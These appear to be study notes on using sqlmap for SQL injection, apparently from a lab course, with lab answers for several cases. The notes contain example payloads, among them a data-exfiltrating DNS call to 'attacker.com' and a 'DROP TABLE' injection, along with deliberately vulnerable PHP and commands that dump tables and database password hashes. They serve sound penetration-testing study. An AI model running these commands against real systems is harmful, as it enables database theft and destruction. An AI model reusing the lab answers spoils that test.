# SQLMAP basics

## Supported databases 

```
MySQL 	Oracle 	PostgreSQL 	Microsoft SQL Server SQLite 	IBM DB2 	Microsoft Access 	Firebird
Sybase 	SAP MaxDB 	Informix 	MariaDB HSQLDB 	CockroachDB 	TiDB 	MemSQL H2 	
MonetDB 	Apache Derby 	Amazon Redshift Vertica, Mckoi 	Presto 	Altibase 	MimerSQL CrateDB 
Greenplum 	Drizzle 	Apache Ignite Cubrid 	InterSystems Cache 	IRIS 	eXtremeDB FrontBase 
```

## Supported Injection Types

BEUSTQ

B: Boolean-based blind SQL injecyions

	- OR 1=1
	- Differentiation between TRUE and FALSE
	- Most common.

E: Error-based

	- AND GTID_SUBSET(@@version,0)
	- Specialised payloads are created to return errors known errors.
	- Second fastest after UNION. 

U: Union query-based

	- UNION ALL SELECT 1,@@version,3
	- Extends the original vulnerable query with statement to build out database etc.
	- Fastest 

S: Stacked queries

	- ; DROP TABLE users
	- Injects additional SQL statement after vulnerable one. 
	- Must be supported by platform (MSSQL supports)
	- Run non-query based statements 

T: Time-based blind

	- AND 1=IF(2>1,SLEEP(5),0)
	- Simialr to boolean but the response time is used as the source of differentation rather than TRUE/FALSE
	- Any time difference =TRUE while no difference = FALSE
	- Slow 
	- Used only when it has to be (If boolean won't have a response).

q: Inline queries

	- SELECT (SELECT @@version) from
	- Embed a query within the original query. 
	- Uncommon as web app needs to be written in a set way.

Additionally supported Out-of-band injection:
	
	- LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))
	- Most advanced and only used where all other types are unsupported or are too slow.
	- Runs on the DNS server. 
	- Forces the server to request non-existent subdomains 
	- SQLMap collects the errors and the non-existent subdomain part to form the SQL response.


## Basic usage

```sqlmap -h``` and ```sqlmap -hh``` for help options

```sqlmap -u <url> --batch (this option skips user iput selecting the default option)```

Example of vulnerable code

```
$link = mysqli_connect($host, $username, $password, $database, 3306);
$sql = "SELECT * FROM users WHERE id = " . $_GET["id"] . " LIMIT 0, 1";
$result = mysqli_query($link, $query);
if (!$result)
    die("<b>SQL error:</b> ". mysqli_error($link) . "<br>\n");
```

In the $sql statement the ```$_GET[]``` can be used to put an sql statment 

## Output 

URL content is stable.
	- Means no major changes between responses that are the same (i.e requesting the web page twice).
	- Important as in the event of stable responses it is easier to spot difference caused by sqli.
	- SQLMap can remove noise caused by instability. 

Parameter '' appears to be dynamic.
	- Parameter maybe linked to database if it changes depending on value

Parameter '' might be injectable.
	- Possible SQLi

Parameter '' might be vulnerable to XSS attacks.
	- SQLMap sometimes detects possible XSS vulnerabilities.

back-end DBMS is ''.
	- Type of database

level/risks
	- If it is clear what the database is it is possible to extend the tests for that DBMS beyond standard tests.
	- If not done then only the top payloads would be tested.

Reflective Values found
	- Warning that parts of the used payloads are found in the response.
	- Problem for automation but SQLMap can filter them out.

Parameter appears to be injectable.
	- Possible SQLi but maybe false positive 
	- if with --string="luther" is found then SQLMap has better chance of disguishing false positive.

Time-based comparison statistical model
	- SQLMap uses a statistical model for the recognition of regular and (deliberately) delayed target responses. 
	- SQLMap can statistically distinguish between the deliberate delay even in the high-latency network environments.

Extending UNION query injection technique tests.
	- UNION statements need significantly more requests than other methods.
	- To stop overload the number of requests can be limited if a parameter does not apeear injectable.
	- However if another SQLi technique is found the SQLMap extends the limit beacuse of higher change of success.

Technique appears to be usable.
	- A heuristic check for UNION-query SQLi type before sending the UNION payload is the ORDER BY technique. 
	- If the ORDER BY is usable then SQLMap reconizes the correct number of required UNION columns by binary search.

Parameter is vulnerable
	- Definite SQLi

Sqlmap identified injection points
	- Identified injection points.

Data logged to text file
	- Stores session data which can be used again.

## SQLMap on HTTP requests.

Stupid mistakes like forgetting cookie values, overly-complicating setup or impoper declaration of formatted POST data ruins sqlmap.


### CURL

Easiest way to properly set up and SQLMap request against specific target is bu copy as cURL feature from network panel inside firefox developer tools.

Note this doesn't actually set the parameter to be checked (needs --crawl, --forms or -g)

### GET/POST requests

GET requests are made using -u/--url with the --crawl, --forms etc. 

Post requests are made using the --data argument.

```sqlmap 'http://www.example.com/' --data 'uid=1&name=test'```

In this case both parameters will be tested for however using 

```sqlmap -u 'http://www.example.com/' --data 'uid=1&name=test' -p uid``` or ```sqlmap -u 'http://www.example.com/' --data 'uid=1*&name=test'```

Will only test for the uid parameter (-p or the ```*```)

### Full HTML requests

Caputre the http headers, put them into a file then give to sqlmap with -r

Caputre response with burp and save or in network tab copy the copy request header and save in file.

### Custom requests

Providing cookies to sqlmap is done using --cookie or -H

```sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'```

```sqlmap ... -H='Cookie:PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'```

Can apply --host, --referer -A/--user-agent which are used to specify the same HTTP headers' values.

--random-agent randomly selects a User-agent header value from a database to use. Useful as sqlmaps default user-agent (User-agent: sqlmap/1.4.9.12#dev (http://sqlmap.org)) is often dropped from HTTP traffic due to secruity.

We can also specify alternative HTTP method other than get, post using the --method 

```sqlmap -u www.target.com --data='id=1' --method PUT```

### Custom request - testing headers.

By default SQLMap targets only HTTP parameters. It is possible to test headers for SQLi vulns 

This is done by putting the custom injection mark (```*```) in a header's value (```--cookie="id=*"```)

### Custom HTTP Requests

SQLMap also supports JSON and XML formatted HTTP POST requests. 

Often the --data arg will work but in the case of long post requests put it in a file and use -r

### Questions


Test question sqlmap -u  http://167.172.52.221:31935/case1.php?id=1 --batch --dump (get request)

What's the contents of table flag2? (Case #2) Do a post request

command
```sqlmap -u  http://167.172.52.221:31935/case2.php --data "id=1" --batch --dump ``` notice that the id is the data section and the url doesn't have the get parameter in it


 What's the contents of table flag3? (Case #3) Find an injection vuln in a cookie

command

```sqlmap -u  http://167.172.52.221:31935/case3.php --cookie "id=1*" --batch --dump```

What's the contents of table flag4? (Case #4) Find an injection vuln in a json

```sqlmap -u  http://167.172.52.221:31935/case4.php --data '{"id": 1}' --batch --dump```

## Handling SQLMap Errors

To display any errors use ```--parse-errors``` to output any errors

To store the traffic (for inspection for later usage) use ```-t``` and file path to store the data

Use ```-v``` for more verbose output (```-v 6``` prints everything out to the console)

use ```--proxy``` to pass everything through burp.

## Attack tuning

Most of the time sqlmap will work right out of the box however sometimes it will need fine-tuning.

Payloads consist of vector (the SQL statement to be excuted) and the boundaries. Boundaries are prefix and suffix information used for proper injection of the vector into the vulnerable SQL statement i.e ```-- -``` to comment stuff out etc.

### Prefix/Suffix 

To change prefix and suffix not covered by SQLMap (this is rare) can be done using the ```--prefix``` and ```--suffix``` args.

An example

```sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"```

will resut in the enclosure of the vector between ```%'))``` and ```-- -```

so the vulnerable code 

```
$query = "SELECT id,name,surname FROM users WHERE id LIKE (('" . $_GET["q"] . "')) LIMIT 0,1";
$result = mysqli_query($link, $query);
```

will result in this ```SELECT id,name,surname FROM users WHERE id LIKE (('test%')) UNION ALL SELECT 1,2,VERSION()-- -')) LIMIT 0,1``` sql statement.

### Level/Risk 

SQLMap combines a predefined set of most common boundaries along with vectors having a high change of success. 

This can be altered to include boundaries and vectors deemed less likely to have success using the ```--level``` and ```--risk```


```--level``` (1-5 with 1 as default) extends the vectors and boundaries being used based on their expectancy of success (the lower the level the higher the expectancy of success)
```--risk``` (1-3 default 1) extends the used vector set based on their risk of casuing potential errors at the target side (i.e database loss)

This makes the whole system so much slower (level and risk 1 is 72 parameters while level 5, risk 3 is 7,865)

Increasing the risk level brings in the use of ```OR``` statements which are sometimes necessary (like login pages) but are a lot more dangerous.

### Advanced tuning

Status code tuning
	- A status code can be assigned as True by using ```--code=<code here>```. So 200 could be true and everything else that isn't 200 is false.

Titles 
	- If a difference in response can be seen between responses by inspecting the HTTP page titles the switch ```--titles``` can be used to instruct the detection mechanism to base the comparison based on the content of the HTML tag <title>

Strings
	- String values can be assigned TRUE (i.e the string success) by using ```--string=<str value>```

Text-only
	- Remove all HTML tags and just looks at the text using ```--text-only```

Techniques
	- Can narrow down the payload to a certain tpye by using ```--technique=BEUSTQ``` (remove letters that we don't want the to be tested in the payload)

UNION SQLi Tuning
	- UNION SQLi payloads sometimes require extra user-provided info, such as the number of columns.
	- We can specify ```--union-cols=<num of cols>```
	- Sometimes SQLMaps -NULL and random integer- are not compatible with values from results of the vulnerable SQL query (when building out number of columns etc in database)
	- We can specify an alternative value instead using ```--union-char='<val here>'```
	- If we need to use an appendix at the end of a UNION query i.e ```FROM <table>``` (e.g., in case of Oracle), this can be set with ```--union-from=<val here>``` 

### Questions

What's the contents of table flag5? (Case #5)
command
```sqlmap -u http://167.172.52.221:32606/case5.php?id=1 -T 'flag5' --dump --risk=3 --batch```

What's the contents of table flag6? (Case #6)
command
```sqlmap -u http://167.172.52.221:32606/case6.php?col=id --dump --batch --prefix='`)' ```

What's the contents of table flag6? (Case #7)
```sqlmap -u http://167.172.52.221:32606/case7.php?id=1 --batch --union-cols=5 --dbms='mysql' --dump```

## Database enumeration

SQLMap has a variety of predefined set of quires to enumerate a database.

Basic Methodology

1) Get the Database type, current user, is the current user the database admin and database name using the ```--banner```, ```--current-user``` , ```--current-db``` and ```--is-dba``` 
```sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba```

2) Enumerate tables. Use ```--tables``` to enuerate tables  and ```-D <database name>``` 
```sqlmap -u "http://www.example.com/?id=1" --tables -D testdb```

3) Dump a table using the ```-T <table name>``` and ```--dump```
```sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb```

4) Further Column enumeration with  ```-C <column names here>``` or ```--start=<column number>``` and ```--stop=<column number>``` (not 0 indexed) or based on conditional statements with ```--where=<condition```

```sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname```
```sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --start=2 --stop=3```
```sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"```


CHEAT way. Use ```--dump -D <database name>``` or ```--dump-all``` with the ```--exclude-sysdbs``` to only get useful databases.

### More advanced

Use ```--schema``` to get a complete overview of database architecture

search for data using ```--search``` For example if we wanted to look for tables with keyword user or columns with pass

```sqlmap -u "http://www.example.com/?id=1" --search -T user```
```sqlmap -u "http://www.example.com/?id=1" --search -C pass```

We can dump the content of the system table containing database-specific crexdentials using ```--passwords```

```sqlmap -u "http://www.example.com/?id=1" --passwords --batch```

```--all``` with the ```--batch``` switch will do all the enumeration